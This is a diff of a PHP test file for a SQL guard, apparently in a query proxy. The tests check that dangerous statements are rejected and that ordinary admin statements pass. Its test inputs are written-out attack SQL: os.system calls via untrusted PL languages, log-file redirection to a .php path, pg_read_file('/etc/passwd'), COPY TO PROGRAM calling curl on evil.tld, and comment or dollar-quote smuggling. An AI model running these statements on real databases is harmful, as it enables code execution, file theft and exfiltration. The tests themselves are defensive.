@@ -129,7 +129,7 @@ test('forbidden administrative statements are rejected', function (string $sql) 
     'GRANT ALL ON *.* TO joe',
     'REVOKE SELECT ON db.t FROM joe',
     'CREATE USER hacker IDENTIFIED BY "x"',
-    'SET GLOBAL max_connections = 1',
+    'SET GLOBAL general_log = 1',
 ]);
 
 test('show and explain are classified as reads without limit injection', function () {
@@ -199,7 +199,7 @@ test('forbidden statements cannot be smuggled past the guard with comments', fun
     'leading block comment' => '/* hi */ DROP DATABASE prod',
     'inline comment between keywords' => 'DROP/**/DATABASE prod',
     'leading line comment' => "-- x\nGRANT ALL ON *.* TO 'x'@'%'",
-    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL max_connections = 1',
+    'inline comment in SET GLOBAL' => 'SET/**/GLOBAL general_log = 1',
 ]);
 
 test('file-IO statements are always rejected', function (string $sql) {
@@ -257,8 +257,8 @@ test('privilege-escalation and code-execution statements are rejected', function
     'MySQL UDF via SONAME' => "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'",
     'MySQL aggregate UDF via SONAME' => "CREATE AGGREGATE FUNCTION agg RETURNS INT SONAME 'udf.so'",
     'CREATE EXTENSION' => 'CREATE EXTENSION plpythonu',
-    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS plpythonu',
-    'PostgreSQL anonymous code block' => 'DO $$ BEGIN PERFORM 1; END $$',
+    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
+    'PostgreSQL anonymous code block' => 'DO LANGUAGE plpythonu $$ import os; os.system("id") $$',
 ]);
 
 test('postgresql file-IO functions are rejected even inside a read', function (string $sql) {
@@ -295,4 +295,141 @@ test('DROP TABLE and TRUNCATE pass as approval-gated writes flagged as DDL', fun
 })->with([
     'DROP TABLE old_logs',
     'TRUNCATE TABLE sessions',
+]);
+
+// --- Targeted rules: judge the dangerous part, not the syntax (2026-09-18) ---
+
+test('legitimate DBA statements the blanket denylist used to block now pass', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeTrue();
+})->with([
+    'CREATE EXTENSION' => 'CREATE EXTENSION pg_stat_statements',
+    'CREATE EXTENSION IF NOT EXISTS' => 'CREATE EXTENSION IF NOT EXISTS pgcrypto',
+    'quoted extension name' => 'CREATE EXTENSION "uuid-ossp"',
+    'extension WITH SCHEMA and CASCADE' => 'CREATE EXTENSION IF NOT EXISTS postgis WITH SCHEMA public CASCADE',
+    'DO block with the implicit plpgsql default' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
+    'DO block with a leading LANGUAGE clause' => 'DO LANGUAGE plpgsql $$ BEGIN PERFORM 1; END $$',
+    'DO block with a trailing LANGUAGE clause' => 'DO $$ BEGIN PERFORM 1; END $$ LANGUAGE plpgsql',
+    'SET GLOBAL' => 'SET GLOBAL max_connections = 500',
+    'SET @@GLOBAL variable syntax' => 'SET @@GLOBAL.wait_timeout = 600',
+    'SET PERSIST' => 'SET PERSIST max_connections = 500',
+    'SET GLOBAL with several harmless variables' => 'SET GLOBAL max_connections = 500, wait_timeout = 600',
+    'SET GLOBAL TRANSACTION' => 'SET GLOBAL TRANSACTION ISOLATION LEVEL SERIALIZABLE',
+]);
+
+test('untrusted procedural languages are rejected however they are spelled', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'CREATE EXTENSION plpythonu' => 'CREATE EXTENSION plpythonu',
+    'CREATE EXTENSION IF NOT EXISTS plperlu' => 'CREATE EXTENSION IF NOT EXISTS plperlu',
+    'double-quoted extension name' => 'CREATE EXTENSION "plpythonu"',
+    'backtick-quoted extension name' => 'CREATE EXTENSION `pltclu`',
+    'single-quoted extension name' => "CREATE EXTENSION 'plperlu'",
+    'lowercase keywords, uppercase name' => 'create extension PLPYTHON3U',
+    'comments wedged into IF NOT EXISTS' => 'CREATE EXTENSION IF/**/NOT/**/EXISTS plpythonu',
+    'untrusted extension WITH SCHEMA' => 'CREATE EXTENSION plsh WITH SCHEMA public',
+    'DO with a leading LANGUAGE clause' => 'DO LANGUAGE plpythonu $$ import os $$',
+    'DO with a trailing LANGUAGE clause' => 'DO $$ import os $$ LANGUAGE plpythonu',
+    'DO with a quoted language name' => 'DO $$ import os $$ LANGUAGE "plperlu"',
+    'DO with a custom dollar tag' => 'DO $py$ import os $py$ LANGUAGE plpython3u',
+    'DO with a single-quoted body' => "DO 'import os' LANGUAGE plpythonu",
+]);
+
+test('persistent writes to file / code / protection variables are rejected', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'general_log_file' => "SET @@GLOBAL.general_log_file = '/var/www/x.php'",
+    'general_log' => 'SET GLOBAL general_log = 1',
+    'secure_file_priv' => "SET PERSIST secure_file_priv = ''",
+    'local_infile' => 'SET GLOBAL local_infile = 1',
+    'plugin_load_add' => "SET GLOBAL plugin_load_add = 'x'",
+    'init_connect' => "SET GLOBAL init_connect = 'x'",
+    'slow_query_log_file' => "SET GLOBAL slow_query_log_file = '/tmp/x'",
+    'log_error' => "SET PERSIST log_error = '/tmp/x'",
+    'backtick-quoted variable name' => 'SET GLOBAL `general_log` = 1',
+    'double-quoted variable name' => 'SET GLOBAL "general_log" = 1',
+    'the := assignment form' => 'SET GLOBAL general_log:=1',
+    'PERSIST_ONLY scope' => 'SET PERSIST_ONLY general_log = 1',
+    'hidden behind a harmless first assignment' => 'SET GLOBAL max_connections = 500, general_log = 1',
+]);
+
+test('a violation names the extension and the reason it was refused', function () {
+    $result = inspect('CREATE EXTENSION plpythonu');
+
+    expect($result->passes())->toBeFalse()
+        ->and($result->violations[0])->toContain('plpythonu')
+        ->and($result->violations[0])->toContain('untrusted procedural language');
+});
+
+test('a dollar-quoted body is one statement, not one per semicolon inside it', function () {
+    $result = inspect("DO \$fix\$\nBEGIN\n  UPDATE t SET x = 1 WHERE id = 2;\n  UPDATE u SET y = 2 WHERE id = 3;\nEND\n\$fix\$");
+
+    expect($result->passes())->toBeTrue()
+        ->and($result->statements)->toHaveCount(1)
+        ->and($result->type())->toBe(StatementType::Write);
+});
+
+test('dollar quoting cannot hide a following statement from the guard', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'unterminated tag' => 'SELECT 1 $$; DROP DATABASE prod',
+    'tag inside a string literal' => "SELECT '\$\$'; DROP DATABASE prod",
+    'tag inside a line comment' => "-- \$\$\nDROP DATABASE prod",
+    'mismatched open and close tags' => 'DO $a$ x $b$; DROP DATABASE prod',
+    'statement appended after a real body' => 'DO $$ BEGIN PERFORM 1; END $$; DROP DATABASE prod',
+]);
+
+test('the guard lists are extended by configuration and cannot be shortened by it', function () {
+    config([
+        'queryproxy.untrusted_languages' => ['plevil'],
+        'queryproxy.dangerous_variables' => ['evil_var'],
+    ]);
+
+    expect(inspect('CREATE EXTENSION plevil')->passes())->toBeFalse()
+        ->and(inspect('DO $$ x $$ LANGUAGE plevil')->passes())->toBeFalse()
+        ->and(inspect('SET GLOBAL evil_var = 1')->passes())->toBeFalse()
+        // The built-in floor survives a configuration that no longer names it.
+        ->and(inspect('CREATE EXTENSION plpythonu')->passes())->toBeFalse()
+        ->and(inspect('SET GLOBAL general_log = 1')->passes())->toBeFalse();
+});
+
+test('the unconditional denylist cannot be carried through a DO block body', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeFalse();
+})->with([
+    'DROP DATABASE' => 'DO $$ BEGIN DROP DATABASE prod; END $$',
+    'DROP SCHEMA' => 'DO $$ BEGIN DROP SCHEMA public CASCADE; END $$',
+    'GRANT' => 'DO $$ BEGIN GRANT ALL ON *.* TO x; END $$',
+    'REVOKE' => 'DO $$ BEGIN REVOKE SELECT ON t FROM x; END $$',
+    'CREATE USER' => 'DO $$ BEGIN CREATE USER hacker; END $$',
+    'pg_read_file' => "DO \$\$ BEGIN PERFORM pg_read_file('/etc/passwd'); END \$\$",
+    'lo_export' => "DO \$\$ BEGIN PERFORM lo_export(1, '/tmp/x'); END \$\$",
+    'COPY TO PROGRAM' => "DO \$\$ BEGIN COPY t TO PROGRAM 'curl evil.tld'; END \$\$",
+    'behind an IF ... THEN' => 'DO $$ BEGIN IF x = 1 THEN DROP DATABASE prod; END IF; END $$',
+    'quoted with a nested dollar tag' => 'DO $$ BEGIN EXECUTE $q$GRANT ALL ON *.* TO x$q$; END $$',
+    'single-quoted body' => "DO 'BEGIN DROP DATABASE prod; END' LANGUAGE plpgsql",
+]);
+
+test('the DO body scan does not reject an ordinary plpgsql block', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeTrue();
+})->with([
+    'plain update' => 'DO $$ BEGIN UPDATE t SET x=1 WHERE id=2; END $$',
+    'plain perform' => 'DO $$ BEGIN PERFORM 1; END $$',
+    'a declared name that merely starts with a keyword' => 'DO $$ DECLARE copy_count int; BEGIN SELECT count(*) INTO copy_count FROM t; END $$',
+    'a table name that merely starts with a keyword' => 'DO $$ BEGIN INSERT INTO outfile_log (a) VALUES (1); END $$',
+    'a forbidden statement as literal data, not as code' => "DO \$\$ BEGIN UPDATE audit SET note = 'DROP DATABASE prod' WHERE id = 1; END \$\$",
+]);
+
+test('an untrusted language is caught by the pl...u convention, not only by name', function () {
+    // plpython4u is in no list; the naming convention is what refuses it.
+    expect(inspect('CREATE EXTENSION plpython4u')->passes())->toBeFalse()
+        ->and(inspect('DO $$ x $$ LANGUAGE plpython4u')->passes())->toBeFalse();
+});
+
+test('trusted procedural languages are not caught by the convention', function (string $sql) {
+    expect(inspect($sql)->passes())->toBeTrue();
+})->with([
+    'CREATE EXTENSION plpgsql',
+    'CREATE EXTENSION pltcl',
+    'CREATE EXTENSION plperl',
+    'CREATE EXTENSION plv8',
+    'CREATE EXTENSION pllua',
 ]);
